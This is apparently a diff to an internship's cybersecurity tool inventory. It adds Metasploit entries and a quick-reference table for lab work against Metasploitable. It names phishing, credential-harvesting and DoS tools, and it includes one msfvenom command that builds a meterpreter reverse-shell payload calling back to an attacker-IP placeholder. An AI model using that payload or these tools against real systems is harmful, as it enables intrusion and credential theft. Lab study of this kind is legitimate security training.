@@ -41,10 +41,14 @@ A running inventory of every tool encountered during the internship, organized b
 | 29 | tshark | Network Analysis | Day 08 | CLI-based Wireshark for headless packet capture and scripted analysis |
 | 30 | Zphisher | Social Engineering | Day 09 | Automated phishing page generator with pre-built templates for 30+ popular platforms |
 | 31 | SET (Social Engineering Toolkit) | Social Engineering | Day 09 | Advanced social engineering framework for live website cloning and credential harvesting |
-| 32 | Ngrok | Networking / Tunneling | Day 09 | Secure tunnel for exposing local servers to the internet via public URLs || 33 | hping3 | Network Analysis | Day 10 | Packet crafter for custom TCP/UDP floods, SYN flood testing, and traffic generation |
+| 32 | Ngrok | Networking / Tunneling | Day 09 | Secure tunnel for exposing local servers to the internet via public URLs |
+| 33 | hping3 | Network Analysis | Day 10 | Packet crafter for custom TCP/UDP floods, SYN flood testing, and traffic generation |
 | 34 | Slowloris | Network Analysis | Day 10 | Application-layer DoS tool that holds HTTP connections open to exhaust server resources |
 | 35 | iptables | Linux / System | Day 10 | Netfilter firewall utility for packet filtering, rate limiting, and SYN flood mitigation |
 | 36 | sysctl | Linux / System | Day 10 | Kernel configuration utility for tuning TCP/IP stack behavior and mitigation settings |
+| 37 | Metasploit Framework | Offensive Security | Day 11 | Modular exploitation framework with exploits, payloads, and auxiliary modules |
+| 38 | msfconsole | Offensive Security | Day 11 | Primary Metasploit interactive console for attack workflows |
+| 39 | msfvenom | Offensive Security | Day 11 | Payload creation and encoding tool for Metasploit |
 ---
 
 ## By Category
@@ -111,6 +115,10 @@ A running inventory of every tool encountered during the internship, organized b
 |---|---|---|
 | Metasploitable 2 | Deliberately vulnerable target VM | Default login: `msfadmin / msfadmin` |
 | VirtualBox | VM hypervisor for lab environments | `VBoxManage startvm <vmname>` |
+| Metasploit Framework | Modular exploitation framework | `msfconsole` |
+| msfconsole | Interactive Metasploit console | `msfconsole` |
+| msfvenom | Payload generation and encoding | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf` |
+| Metasploit Framework | Modular exploitation framework | `msfconsole` |
 
 ---
 
